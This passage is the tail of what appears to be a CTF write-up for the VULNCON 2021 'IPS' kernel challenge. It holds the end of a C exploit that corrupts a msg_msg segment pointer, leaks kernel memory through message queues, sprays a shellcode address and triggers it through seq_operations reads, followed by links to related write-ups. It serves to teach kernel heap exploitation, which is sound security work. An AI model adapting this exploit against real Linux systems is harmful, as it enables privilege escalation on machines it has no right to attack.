	// getchar();


	memset(payload, 0, sizeof(payload));
	memset(payload, '\xff', 2);
	ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141; // m_type
	ptr[1] = 0x3131313131313131; // m_ts
	ptr[2] = real_seq_op_addr - 8; // struct msg_msgseg *next;
	edit(-1, payload);

	leak_buf = msgQueueRecv(msgqid4, 0x2000, 0)->mtext;

	char* atk = calloc(1, 0x1000);
	for(int i = 0; i < 0x1000/8; i++) {
		((long*)atk)[i] = shellcode;
	}

	for(int s = 0; s < 20; s++) { 
		int tempqid = msgQueueCreate();
		msgQueueSend(tempqid, atk, 0xfd0 + 0x18, 0x5678);
	}


	char win;
    for(int i = 0 ; i < 0x40; i++){
        if (fds[i] > 0) read(fds[i], &win, 1);
    }

	// getchar();
    return 0;
    
}
```



## 参考链接

[Learn msg_msg-Kernel-Exploitation from a CTF challenge: IPS(VULNCON 2021) | n132](https://n132.github.io/2024/02/09/IPS.html)

[Learn Kernel Heap Freelist Hijacking from a CTF challenge: IPS(VULNCON 2021) | n132](https://n132.github.io/2024/02/28/IPS-Freelist.html)

[Learn Kernel Heap Cross Page Overwrite and Page Level Fengshui from a CTF challenge: IPS(VULNCON 2021) | n132](https://n132.github.io/2024/02/29/IPS-Cross-Slab-Attack.html)

[[VULNCON 2021\] - IPS | kylebot's Blog](https://blog.kylebot.net/2022/01/10/VULNCON-2021-IPS/#Exploitation)

[VULNCON CTF 2021 - IPS | kileak](https://kileak.github.io/ctf/2021/vulncon-ips/)

[CVE-2022-27666: Exploit esp6 modules in Linux kernel - ETenal](https://etenal.me/archives/1825)